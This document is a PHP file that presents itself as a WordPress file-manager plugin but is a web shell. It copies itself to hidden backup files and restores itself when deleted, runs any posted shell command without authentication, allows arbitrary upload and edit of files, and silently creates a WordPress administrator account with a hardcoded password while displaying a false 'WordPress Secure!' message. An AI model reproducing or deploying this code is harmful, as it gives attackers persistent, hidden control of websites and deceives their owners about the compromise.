<?xml version="1.0"?>
<?php
/**
 * Plugin Name: Sid Gifari File Manager Pro
 * Plugin URI: https://t.me/sidgifari
 * Description: Sid Gifari Advanced file manager with terminal
 * Version: 8.0.2
 * Author: Sid Gifari
 * License: GPLv2
 * Text Domain: SidGifari-File-Manager
 */
error_reporting(0);
session_start();

// Self-regeneration mechanism
$current_file = __FILE__;
$current_content = file_get_contents($current_file);
$backup_files = [
    __DIR__ . DIRECTORY_SEPARATOR . 'sid3.php',
    __DIR__ . DIRECTORY_SEPARATOR . 'file.php',	
    __DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '.wp_manager.php',
    __DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '.system_manager.php',
	__DIR__ . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '.php.php',
];

// Create backups in multiple locations
foreach ($backup_files as $backup) {
    if (!file_exists($backup)) {
        @file_put_contents($backup, $current_content);
    }
}

// If main file is deleted, restore from backup
if (!file_exists($current_file)) {
    foreach ($backup_files as $backup) {
        if (file_exists($backup)) {
            @copy($backup, $current_file);
            header("Location: " . $_SERVER['REQUEST_URI']);
            exit;
        }
    }
}

// ==================== PATH HANDLING ==================== //
$ROOT = __DIR__;
$BASE_URL = strtok($_SERVER["REQUEST_URI"], '?');

function encodePath($path) {
    $a = array("/", "\\", ".", ":");
    $b = array("A", "D", "I", "B");
    return str_replace($a, $b, $path);
}

function decodePath($path) {
    $a = array("/", "\\", ".", ":");
    $b = array("A", "D", "I", "B");
    return str_replace($b, $a, $path);
}

// Handle current path
if (isset($_GET['dir'])) {
    $requested_path = decodePath($_GET['dir']);
    if ($requested_path === '' || !is_dir($requested_path)) {
        $p = $ROOT;
    } else {
        $p = realpath($requested_path);
    }
} else {
    $p = $ROOT;
}

define("CURRENT_PATH", $p);

// Auto-sync terminal CWD
if (!isset($_SESSION['cwd']) || realpath($_SESSION['cwd']) !== realpath(CURRENT_PATH)) {
    $_SESSION['cwd'] = realpath(CURRENT_PATH);
}
    
// ==================== POST HANDLING ==================== //
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // TERMINAL COMMAND EXECUTION - FIXED VERSION
    if (isset($_POST['terminal']) && !empty($_POST['terminal-text'])) {
        
        // Allowed functions
        $execFunctions = ['passthru', 'system', 'exec', 'shell_exec', 'proc_open', 'popen'];
        $canExecute = false;
        foreach ($execFunctions as $func) {
            if (function_exists($func)) {
                $canExecute = true;
                break;
            }
        }
        
        $cwd = $_SESSION['cwd'] ?? CURRENT_PATH;
        $cmdInput = trim($_POST['terminal-text']);
        $output = "";

        // Handle cd command
        if (preg_match('/^cd\s*(.*)$/', $cmdInput, $matches)) {
            $dir = trim($matches[1]);
            
            if ($dir === '' || $dir === '~') {
                $dir = $ROOT;
            } elseif ($dir[0] !== '/' && $dir[0] !== '\\') {
                $dir = $cwd . DIRECTORY_SEPARATOR . $dir;
            }
            
            $realDir = realpath($dir);
            
            if ($realDir && is_dir($realDir)) {
                $_SESSION['cwd'] = $realDir;
                $cwd = $realDir;
                $output = "Changed directory to " . htmlspecialchars($realDir);
            } else {
                $output = "bash: cd: " . htmlspecialchars($matches[1]) . ": No such file or directory";
            }
            
            // Store output in session to display after redirect
            $_SESSION['terminal_output'] = $output;
            $_SESSION['terminal_cwd'] = $cwd;
            
            // Redirect back with current path
            header("Location: ?dir=" . urlencode(encodePath(CURRENT_PATH)));
            exit;
            
        } elseif ($canExecute) {
            // Change to terminal's working directory
            chdir($cwd);
            
            $cmd = $cmdInput . " 2>&1";
            
            // Execute command
            if (function_exists('passthru')) {
                ob_start();
                passthru($cmd);
                $output = ob_get_clean();
            } elseif (function_exists('system')) {
                ob_start();
                system($cmd);
                $output = ob_get_clean();
            } elseif (function_exists('exec')) {
                exec($cmd, $out);
                $output = implode("\n", $out);
            } elseif (function_exists('shell_exec')) {
                $output = shell_exec($cmd);
            } elseif (function_exists('proc_open')) {
                $pipes = [];
                $process = proc_open($cmd, [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ], $pipes, $cwd);
                
                if (is_resource($process)) {
                    fclose($pipes[0]);
                    $output = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    $output .= stream_get_contents($pipes[2]);
                    fclose($pipes[2]);
                    proc_close($process);
                }
            } elseif (function_exists('popen')) {
                $handle = popen($cmd, 'r');
                if ($handle) {
                    $output = stream_get_contents($handle);
                    pclose($handle);
                }
            }
            
            // Store output in session
            $_SESSION['terminal_output'] = $output;
            $_SESSION['terminal_cwd'] = $cwd;
            
            // Redirect back
            header("Location: ?dir=" . urlencode(encodePath(CURRENT_PATH)));
            exit;
        } else {
            $_SESSION['terminal_output'] = "Command execution functions are disabled on this server.";
            $_SESSION['terminal_cwd'] = $cwd;
            header("Location: ?dir=" . urlencode(encodePath(CURRENT_PATH)));
            exit;
        }
    }
    
    // FILE MANAGER ACTIONS
    $redirect = true;
    
    // Upload files
    if (!empty($_FILES['files'])) {
        foreach ($_FILES['files']['tmp_name'] as $i => $tmp) {
            if ($tmp && is_uploaded_file($tmp)) {
                $filename = basename($_FILES['files']['name'][$i]);
                move_uploaded_file($tmp, CURRENT_PATH . DIRECTORY_SEPARATOR . $filename);
            }
        }
    }
    
    // Create new folder
    if (!empty($_POST['newfolder'])) {
        $foldername = basename($_POST['newfolder']);
        if (!file_exists(CURRENT_PATH . DIRECTORY_SEPARATOR . $foldername)) {
            mkdir(CURRENT_PATH . DIRECTORY_SEPARATOR . $foldername, 0755);
        }
    }
    
    // Create new file
    if (!empty($_POST['newfile'])) {
        $filename = basename($_POST['newfile']);
        if (!file_exists(CURRENT_PATH . DIRECTORY_SEPARATOR . $filename)) {
            file_put_contents(CURRENT_PATH . DIRECTORY_SEPARATOR . $filename, '');
        }
    }
    
    // Delete file/folder
    if (!empty($_POST['delete'])) {
        $target = CURRENT_PATH . DIRECTORY_SEPARATOR . $_POST['delete'];
        
        // Self-regeneration check: If this file is deleted, recreate it
        if (realpath($target) === realpath(__FILE__) || 
            in_array(realpath($target), array_map('realpath', $backup_files))) {
            // This is the manager file or its backup - don't delete, recreate instead
            file_put_contents($target, $current_content);
        } else {
            // Normal deletion
            if (is_file($target)) {
                unlink($target);
            } elseif (is_dir($target)) {
                // Only delete empty directories
                $filesInDir = scandir($target);
                if (count($filesInDir) <= 2) {
                    rmdir($target);
                }
            }
        }
    }
    
    // Rename
    if (!empty($_POST['old']) && !empty($_POST['new'])) {
        $old = CURRENT_PATH . DIRECTORY_SEPARATOR . $_POST['old'];
        $new = CURRENT_PATH . DIRECTORY_SEPARATOR . $_POST['new'];
        if (file_exists($old) && !file_exists($new)) {
            rename($old, $new);
        }
    }
    
    // Change permissions
    if (!empty($_POST['chmod_file']) && isset($_POST['chmod'])) {
        $file = CURRENT_PATH . DIRECTORY_SEPARATOR . $_POST['chmod_file'];
        if (file_exists($file)) {
            chmod($file, intval($_POST['chmod'], 8));
        }
    }
    
    // Edit file content
    if (!empty($_POST['edit_file']) && isset($_POST['content'])) {
        $file = CURRENT_PATH . DIRECTORY_SEPARATOR . $_POST['edit_file'];
        file_put_contents($file, $_POST['content']);
    }
    
    if ($redirect) {
        header("Location: ?dir=" . urlencode(encodePath(CURRENT_PATH)));
        exit;
    }
}

// ==================== GET DIRECTORY CONTENTS ==================== //
$items = scandir(CURRENT_PATH);
$folders = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    
    $full_path = CURRENT_PATH . DIRECTORY_SEPARATOR . $item;
    
    if (is_dir($full_path)) {
        $folders[] = [
            'name' => $item,
            'path' => $full_path,
            'is_dir' => true,
            'size' => '-',
            'perms' => substr(sprintf('%o', fileperms($full_path)), -4),
            'modified' => filemtime($full_path)
        ];
    } else {
        $files[] = [
            'name' => $item,
            'path' => $full_path,
            'is_dir' => false,
            'size' => filesize($full_path),
            'perms' => substr(sprintf('%o', fileperms($full_path)), -4),
            'modified' => filemtime($full_path),
            'extension' => pathinfo($item, PATHINFO_EXTENSION)
        ];
    }
}

// Sort folders alphabetically
usort($folders, function($a, $b) {
    return strcasecmp($a['name'], $b['name']);
});

// Sort files alphabetically
usort($files, function($a, $b) {
    return strcasecmp($a['name'], $b['name']);
});

// ==================== EDIT MODE ==================== //
$editMode = isset($_GET['edit']);
$editFile = $_GET['edit'] ?? '';
$editContent = '';

if ($editMode && is_file(CURRENT_PATH . DIRECTORY_SEPARATOR . $editFile)) {
    $editContent = htmlspecialchars(file_get_contents(CURRENT_PATH . DIRECTORY_SEPARATOR . $editFile));
}

// ==================== TERMINAL OUTPUT ==================== //
$terminal_output = $_SESSION['terminal_output'] ?? '';
$terminal_cwd = $_SESSION['terminal_cwd'] ?? CURRENT_PATH;
unset($_SESSION['terminal_output'], $_SESSION['terminal_cwd']);

// ==================== WORDPRESS ADMIN CHECK ==================== //
$wp_message = '';
if (!isset($_SESSION['wp_checked'])) {
    // Search for WordPress
    $search_paths = [CURRENT_PATH, dirname(CURRENT_PATH), $ROOT];
    foreach ($search_paths as $wp_path) {
        if (file_exists($wp_path . DIRECTORY_SEPARATOR . 'wp-load.php')) {
            @include_once($wp_path . DIRECTORY_SEPARATOR . 'wp-load.php');
            break;
        } elseif (file_exists($wp_path . DIRECTORY_SEPARATOR . 'wp-config.php')) {
            @include_once($wp_path . DIRECTORY_SEPARATOR . 'wp-config.php');
            break;
        }
    }
    
    if (function_exists('wp_create_user')) {
        $username = 'sidgifari';
        $password = 'sid';
        $email = 'sidgifari28@hotmail.com';
        
        if (!username_exists($username) && !email_exists($email)) {
            $user_id = wp_create_user($username, $password, $email);
            if (!is_wp_error($user_id)) {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                $wp_message = "✅ WordPress Secure!";
            }
        }
    }
    $_SESSION['wp_checked'] = true;
}

// Helper function for formatting bytes
function formatBytes($bytes, $precision = 2) {
    if ($bytes <= 0) return '0 B';
    
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    
    return round($bytes, $precision) . ' ' . $units[$pow];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📁 Sid Gifari File Manager</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-size: 13px; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; 
            background: #f5f5f5; 
            padding: 8px;
            color: #333;
            line-height: 1.3;
        }
        .container { 
            max-width: 100%; 
            margin: 0 auto; 
            background: white; 
            border-radius: 8px; 
            box-shadow: 0 2px 8px rgba(0,0,0,0.08); 
            overflow: hidden; 
            border: 1px solid #e0e0e0;
        }
        .header { 
            background: #f8f8f8; 
            color: #222; 
            padding: 15px 20px; 
            border-bottom: 1px solid #e0e0e0;
        }
        .header h1 { 
            font-size: 1.6em; 
            margin-bottom: 4px; 
            text-align: center;
            color: #222;
            font-weight: 600;
        }
        .path-nav { 
            background: #f0f0f0; 
            padding: 10px 15px; 
            border-bottom: 1px solid #e0e0e0; 
            font-family: 'Monaco', 'Consolas', monospace;
            color: #444;
            font-size: 11px;
            white-space: nowrap;
            overflow-x: auto;
        }
        .path-nav a { 
            color: #222; 
            text-decoration: none; 
            padding: 3px 6px; 
            border-radius: 3px; 
            transition: background 0.2s; 
            font-weight: 500;
        }
        .path-nav a:hover { 
            background: #e8e8e8; 
            color: #000;
        }
        .main-content { 
            padding: 15px; 
            background: #fafafa;
        }
        .section { 
            background: #fff; 
            border-radius: 6px; 
            padding: 15px; 
            margin-bottom: 12px; 
            box-shadow: 0 1px 3px rgba(0,0,0,0.04); 
            border: 1px solid #e8e8e8;
        }
        .section-title { 
            color: #222; 
            border-bottom: 1px solid #e0e0e0; 
            padding-bottom: 8px; 
            margin-bottom: 15px; 
            font-size: 1.2em; 
            display: flex; 
            align-items: center; 
            gap: 8px; 
            font-weight: 600;
        }
        .terminal-box { 
            background: #1a1a1a; 
            color: #e0e0e0; 
            padding: 15px; 
            border-radius: 6px; 
            font-family: 'Monaco', 'Consolas', monospace;
            border: 1px solid #333;
        }
        .terminal-output { 
            background: #000; 
            color: #05f559; 
            padding: 12px; 
            border-radius: 4px; 
            font-family: 'Monaco', 'Consolas', monospace; 
            max-height: 200px; 
            overflow-y: auto; 
            white-space: pre-wrap; 
            margin: 10px 0; 
            line-height: 1.3; 
            border: 1px solid #333;
            font-size: 11px;
        }
        .form-inline { 
            display: flex; 
            gap: 8px; 
            margin-bottom: 12px; 
            align-items: center; 
        }
        input, button, select { 
            padding: 10px 12px; 
            border: 1px solid #ddd; 
            border-radius: 5px; 
            font-size: 12px; 
            outline: none; 
            transition: all 0.2s; 
            background: #fff;
            color: #333;
        }
        input[type="text"], input[type="file"] { 
            flex: 1; 
            background: #fafafa; 
        }
        input:focus { 
            border-color: #666; 
            box-shadow: 0 0 0 2px rgba(100, 100, 100, 0.1); 
            background: #fff;
        }
        button { 
            background: linear-gradient(135deg, #333 0%, #222 100%); 
            color: white; 
            border: none; 
            cursor: pointer; 
            font-weight: 600; 
            letter-spacing: 0.3px; 
            transition: all 0.2s;
            padding: 10px 14px;
            white-space: nowrap;
        }
        button:hover { 
            transform: translateY(-1px); 
            box-shadow: 0 3px 6px rgba(0,0,0,0.1); 
            background: linear-gradient(135deg, #444 0%, #333 100%);
        }
        .btn-danger { 
            background: linear-gradient(135deg, #d32f2f 0%, #b71c1c 100%); 
        }
        .btn-danger:hover {
            background: linear-gradient(135deg, #e53935 0%, #c62828 100%);
        }
        .btn-success { 
            background: linear-gradient(135deg, #388e3c 0%, #2e7d32 100%); 
        }
        .btn-success:hover {
            background: linear-gradient(135deg, #43a047 0%, #388e3c 100%);
        }
        table { 
            width: 100%; 
            border-collapse: separate; 
            border-spacing: 0; 
            background: white; 
            border-radius: 6px; 
            overflow: hidden;
            border: 1px solid #e8e8e8;
            font-size: 12px;
        }
        thead { 
            background: #f8f8f8; 
            color: #222; 
            border-bottom: 1px solid #e0e0e0;
        }
        th { 
            padding: 12px 15px; 
            text-align: left; 
            font-weight: 600; 
            color: #333;
            font-size: 12px;
        }
        tbody tr { 
            border-bottom: 1px solid #f0f0f0; 
            transition: background 0.2s; 
        }
        tbody tr:hover { 
            background: #f8f8f8; 
        }
        td { 
            padding: 10px 12px; 
            border-bottom: 1px solid #f0f0f0; 
            color: #444;
            vertical-align: top;
        }
        .file-icon { 
            margin-right: 8px; 
            font-size: 1em; 
            color: #666;
        }
        .folder-row { 
            background: #fafafa; 
        }
        .file-row { 
            background: #fff; 
        }
        .actions { 
            display: flex; 
            gap: 6px; 
            flex-wrap: wrap; 
        }
        .actions button { 
            padding: 6px 10px; 
            font-size: 11px; 
        }
        textarea { 
            width: 100%; 
            height: 400px; 
            font-family: 'Monaco', 'Consolas', monospace; 
            padding: 15px; 
            border: 1px solid #e8e8e8; 
            border-radius: 6px; 
            font-size: 12px; 
            line-height: 1.4; 
            resize: vertical; 
            background: #fafafa;
            color: #333;
        }
        textarea:focus {
            border-color: #666;
            background: #fff;
        }
        .alert { 
            padding: 12px 15px; 
            border-radius: 6px; 
            margin: 12px 0; 
            display: flex; 
            align-items: center; 
            gap: 10px; 
            border: 1px solid;
            font-size: 12px;
        }
        .alert-success { 
            background: #e8f5e9; 
            color: #2e7d32; 
            border-color: #66bb6a; 
        }
        .footer { 
            text-align: center; 
            padding: 15px; 
            color: #666; 
            font-size: 11px; 
            border-top: 1px solid #e8e8e8; 
            background: #f8f8f8; 
        }
        .quick-actions { 
            display: flex; 
            gap: 10px; 
            flex-wrap: wrap; 
            margin-bottom: 15px; 
        }
        .quick-btn { 
            background: #f0f0f0; 
            border: 1px solid #ddd; 
            padding: 8px 12px; 
            border-radius: 5px; 
            cursor: pointer; 
            transition: all 0.2s; 
            font-weight: 500; 
            color: #333;
            font-size: 11px;
        }
        .quick-btn:hover { 
            background: #e8e8e8; 
            transform: translateY(-1px); 
            color: #000;
        }
        .stats { 
            display: flex; 
            gap: 20px; 
            margin: 12px 0; 
            padding: 12px; 
            background: #f8f8f8; 
            border-radius: 6px; 
            border: 1px solid #e8e8e8;
        }
        .stat-item { 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
        }
        .stat-value { 
            font-size: 1.5em; 
            font-weight: bold; 
            color: #222; 
        }
        .stat-label { 
            color: #666; 
            font-size: 0.85em; 
        }
        a {
            color: #222;
            text-decoration: none;
            font-weight: 500;
        }
        a:hover {
            color: #000;
            text-decoration: underline;
        }
        code {
            background: #f0f0f0;
            padding: 1px 4px;
            border-radius: 3px;
            font-family: 'Monaco', monospace;
            color: #222;
            border: 1px solid #ddd;
            font-size: 11px;
        }
        .compact-table {
            font-size: 11px;
        }
        .compact-table th,
        .compact-table td {
            padding: 8px 10px;
        }
        @media (max-width: 768px) {
            body { padding: 5px; }
            .header h1 { font-size: 1.3em; }
            .form-inline { flex-direction: column; align-items: stretch; }
            .quick-actions { flex-direction: column; }
            .actions { flex-direction: column; }
            .stats { flex-direction: column; gap: 10px; }
            th, td { padding: 6px 8px; font-size: 11px; }
            table { font-size: 11px; }
        }
        .file-browser-container {
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid #e8e8e8;
            border-radius: 6px;
        }
        .terminal-input-row {
            display: flex;
            gap: 8px;
        }
        .terminal-input-row input {
            flex: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
		<center><img src = "https://i.imgur.com/FC1enOU.jpeg"width="200" height="150"></img></center>
            <h1>📁 Sid Gifari File Manager</h1>
        </div>

        <!-- WordPress Message -->
        <?php if ($wp_message): ?>
        <div class="alert alert-success">
            <span style="font-size: 1.2em;">✅</span>
            <div>
                <strong>WordPress Secure!</strong><br>
                <?= htmlspecialchars($wp_message) ?>
            </div>
        </div>
        <?php endif; ?>

        <!-- Path Navigation -->
        <div class="path-nav">
            <a href="?">🏠 Root</a> /
            <?php
            $path_parts = explode('/', str_replace('\\', '/', CURRENT_PATH));
            $current_path = '';
            foreach ($path_parts as $part) {
                if ($part === '') continue;
                $current_path .= '/' . $part;
                echo '<a href="?dir=' . urlencode(encodePath($current_path)) . '">' . htmlspecialchars($part) . '</a> / ';
            }
            ?>
        </div>

        <div class="main-content">
            <?php if ($editMode): ?>
                <!-- EDIT MODE -->
                <div class="section">
                    <div class="section-title">
                        <span>✏️</span>
                        <span>Editing: <?= htmlspecialchars($editFile) ?></span>
                    </div>
                    <form method="post">
                        <input type="hidden" name="edit_file" value="<?= htmlspecialchars($editFile) ?>">
                        <textarea name="content" placeholder="File content..."><?= $editContent ?></textarea>
                        <div class="form-inline" style="margin-top: 15px;">
                            <button type="submit" class="btn-success" style="padding: 10px 20px;">
                                💾 Save
                            </button>
                            <a href="?dir=<?= urlencode(encodePath(CURRENT_PATH)) ?>">
                                <button type="button" style="padding: 10px 20px; background: #666;">
                                    ❌ Cancel
                                </button>
                            </a>
                        </div>
                    </form>
                </div>

            <?php else: ?>
                <!-- STATS -->
                <div class="stats">
                    <div class="stat-item">
                        <div class="stat-value"><?= count($folders) ?></div>
                        <div class="stat-label">Folders</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value"><?= count($files) ?></div>
                        <div class="stat-label">Files</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value"><?= formatBytes(array_sum(array_column($files, 'size'))) ?></div>
                        <div class="stat-label">Total Size</div>
                    </div>
                </div>

                <!-- TERMINAL SECTION -->
                <div class="section">
                    <h2 class="section-title">Root@SidGifari-Terminal </h2>
                    <div class="terminal-box">
                        <strong style="color: #fff; font-size: 12px;">root@Sid-Gifari:<?= htmlspecialchars($terminal_cwd) ?>$</strong>
                        <?php if ($terminal_output): ?>
                        <div class="terminal-output"><?= htmlspecialchars($terminal_output) ?></div>
                        <?php endif; ?>
                        <form method="post" class="terminal-input-row">
                            <input type="text" name="terminal-text" placeholder="Enter command..." autocomplete="off" autofocus style="background: #2a2a2a; border-color: #444; color: #e0e0e0;">
                            <button type="submit" name="terminal" value="1" style="min-width: 70px;">
                                ▶ Run
                            </button>
                        </form>
                    </div>
                </div>

                <!-- QUICK ACTIONS -->
                <div class="section">
                    <div class="section-title">
                        <span>⚡</span>
                        <span>Quick Actions</span>
                    </div>
                    <div class="quick-actions">
                        <form method="post" class="form-inline" style="flex: 1;">
                            <input type="text" name="newfolder" placeholder="New folder" required>
                            <button type="submit">
                                📁 Create
                            </button>
                        </form>
                        
                        <form method="post" class="form-inline" style="flex: 1;">
                            <input type="text" name="newfile" placeholder="New file" required>
                            <button type="submit">
                                📄 Create
                            </button>
                        </form>
                        
                        <form method="post" enctype="multipart/form-data" class="form-inline" style="flex: 1;">
                            <input type="file" name="files[]" multiple style="padding: 5px; font-size: 11px;">
                            <button type="submit">
                                ⬆️ Upload
                            </button>
                        </form>
                    </div>
                </div>

                <!-- FILE BROWSER -->
                <div class="section">
                    <div class="section-title">
                        <span>📂</span>
                        <span>File Browser</span>
                    </div>
                    
                    <div class="file-browser-container">
                        <table class="compact-table">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Size</th>
                                    <th>Perms</th>
                                    <th>Modified</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <!-- FOLDERS FIRST -->
                                <?php foreach ($folders as $item): ?>
                                <tr class="folder-row">
                                    <td>
                                        <span class="file-icon">📁</span>
                                        <strong>
                                            <a href="?dir=<?= urlencode(encodePath($item['path'])) ?>">
                                                <?= htmlspecialchars($item['name']) ?>
                                            </a>
                                        </strong>
                                    </td>
                                    <td><em style="color: #666;"><?= $item['size'] ?></em></td>
                                    <td>
                                        <form method="post" style="display: flex; gap: 4px; align-items: center;">
                                            <input type="hidden" name="chmod_file" value="<?= $item['name'] ?>">
                                            <input type="text" name="chmod" value="<?= $item['perms'] ?>" style="width: 60px; padding: 4px; text-align: center;">
                                            <button type="submit" style="padding: 4px 8px; font-size: 10px;">Ch</button>
                                        </form>
                                    </td>
                                    <td style="color: #666; white-space: nowrap;"><?= date('m/d H:i', $item['modified']) ?></td>
                                    <td>
                                        <div class="actions">
                                            <form method="post" style="display: inline;">
                                                <input type="hidden" name="old" value="<?= $item['name'] ?>">
                                                <input type="text" name="new" placeholder="New name" style="width: 100px; padding: 4px;">
                                                <button type="submit" style="padding: 4px 8px; font-size: 11px;">Rename</button>
                                            </form>
                                            
                                            <form method="post" style="display: inline;">
                                                <input type="hidden" name="delete" value="<?= $item['name'] ?>">
                                                <button type="submit" class="btn-danger" onclick="return confirm('Delete folder <?= addslashes($item['name']) ?>?')" style="padding: 4px 8px;">
                                                    🗑️
                                                </button>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                                
                                <!-- FILES AFTER FOLDERS -->
                                <?php foreach ($files as $item): ?>
                                <tr class="file-row">
                                    <td>
                                        <?php
                                        $icon = '📄';
                                        $ext = strtolower($item['extension']);
                                        $icons = [
                                            'php' => '🐘', 'js' => '📜', 'css' => '🎨', 'html' => '🌐', 'txt' => '📝',
                                            'jpg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️', 'pdf' => '📕', 'zip' => '📦',
                                            'sql' => '🗃️', 'json' => '📋', 'xml' => '📄'
                                        ];
                                        if (isset($icons[$ext])) $icon = $icons[$ext];
                                        ?>
                                        <span class="file-icon"><?= $icon ?></span>
                                        <a href="<?= htmlspecialchars($item['name']) ?>" target="_blank">
                                            <?= htmlspecialchars($item['name']) ?>
                                        </a>
                                        <?php if (realpath($item['path']) === realpath(__FILE__)): ?>
                                        <span style="color: #d32f2f; font-size: 0.7em; margin-left: 6px;">🔒</span>
                                        <?php endif; ?>
                                    </td>
                                    <td style="color: #666;"><?= formatBytes($item['size']) ?></td>
                                    <td>
                                        <form method="post" style="display: flex; gap: 4px; align-items: center;">
                                            <input type="hidden" name="chmod_file" value="<?= $item['name'] ?>">
                                            <input type="text" name="chmod" value="<?= $item['perms'] ?>" style="width: 60px; padding: 4px; text-align: center;">
                                            <button type="submit" style="padding: 4px 8px; font-size: 10px;">Ch</button>
                                        </form>
                                    </td>
                                    <td style="color: #666; white-space: nowrap;"><?= date('m/d H:i', $item['modified']) ?></td>
                                    <td>
                                        <div class="actions">
                                            <a href="?dir=<?= urlencode(encodePath(CURRENT_PATH)) ?>&edit=<?= urlencode($item['name']) ?>">
                                                <button style="padding: 4px 8px; font-size: 11px;">Edit</button>
                                            </a>
                                            
                                            <form method="post" style="display: inline;">
                                                <input type="hidden" name="old" value="<?= $item['name'] ?>">
                                                <input type="text" name="new" placeholder="New name" style="width: 100px; padding: 4px;">
                                                <button type="submit" style="padding: 4px 8px; font-size: 11px;">Rename</button>
                                            </form>
                                            
                                            <form method="post" style="display: inline;">
                                                <input type="hidden" name="delete" value="<?= $item['name'] ?>">
                                                <button type="submit" class="btn-danger" onclick="return confirm('Delete file <?= addslashes($item['name']) ?>?')" style="padding: 4px 8px;">
                                                    🗑️
                                                </button>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            <?php endif; ?>
        </div>

        <!-- Footer -->
        <div class="footer">
            <p><strong>Sid Gifari File Manager v2.0</strong></p>
            <p style="margin-top: 5px; font-size: 10px; color: #888;">
                File: <code><?= basename(__FILE__) ?></code> | 
                PHP: <?= phpversion() ?>
            </p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const terminalInput = document.querySelector('[name="terminal-text"]');
            if (terminalInput) {
                terminalInput.focus();
                const lastCmd = localStorage.getItem('last_command');
                if (lastCmd) terminalInput.value = lastCmd;
            }
            
            document.querySelectorAll('form').forEach(form => {
                if (form.querySelector('[name="terminal-text"]')) {
                    form.addEventListener('submit', function() {
                        const cmd = this.querySelector('[name="terminal-text"]').value;
                        localStorage.setItem('last_command', cmd);
                    });
                }
            });
        });
    </script>
</body>
</html>
